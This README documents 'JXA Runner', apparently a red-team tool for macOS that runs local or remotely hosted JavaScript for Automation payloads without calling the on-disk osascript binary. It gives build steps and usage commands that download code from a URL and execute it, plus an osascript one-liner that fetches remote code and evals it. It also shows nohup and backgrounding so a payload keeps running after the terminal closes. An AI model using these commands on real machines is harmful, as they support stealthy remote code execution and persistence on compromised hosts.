# JXA Runner
Swift code to programmatically execute local or hosted JXA payloads without using the on-disk osascript binary. This is helpful when you have Terminal access to a macOS host and want to launch a JXA .js payload without using on-disk osascript commands.

## Steps

1. Ensure you have Xcode installed (which will also install Swift)
2. Open the included xcodeproj file in XCode
3. In XCode: **Product** -> **Build** to build the binary
4. The compiled binary will be dropped to something like: **/Users/[username]/Library/Developer/Xcode/DerivedData/JXARunner-[random]/Build/Products/Debug/JXARunner.app**
5. cd to the Directory in #4 above and then cd to **Contents/MacOS**
6. Then you can copy the JXARunner macho binary to wherever you plan to run it and execute it

## Usage
- For programmatically executing hosted JXA payloads:

> ./JXARunner -u [url_to_jxa_payload]

**Note: This is the programmatic alternative to the command line execution of:
*osascript -l JavaScript -e "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('[url_path]')),$.NSUTF8StringEncoding)));"*

- For programmatically executing local JXA payloads:

> ./JXARunner -f [local_path_to_payload]

**Note: This is the programmatic alternative to the command line execution of:
*osascript -l JavaScvript -e "eval(ObjC.unwrap($.NSString.stringWithContentsOfFile('[filePath]')));"
## Notes
- In its current form, this script does **NOT** background the JXA payload. So you will need to take care of that manually at execution time. Some options for doing so are below:

- If you want the launched JXA payload to continue even after the Terminal you are using is closed, you can run JXA Runner in this manner:

> nohup ./JXARunner -u [url_to_jxa_payload]

- If you simply want to spawn JXA Runner backgrounded you can run it in this manner (however, if the Terminal window is closed the JXA payload will stop running):

> ./JXARunner -f [path_to_local_jxa_payload] &
